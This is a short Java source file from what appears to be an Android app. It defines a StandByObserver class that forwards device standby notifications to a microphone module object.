package com.android.deviceinfo.module;

import com.android.deviceinfo.Standby;
import com.android.deviceinfo.interfaces.Observer;

public class StandByObserver implements Observer<Standby> {

	private ModuleMic moduleMic;

	public StandByObserver(ModuleMic moduleMic) {
		this.moduleMic = moduleMic;
	}

	@Override
	public int notification(Standby b) {
		return moduleMic.notification(b);
	}

}


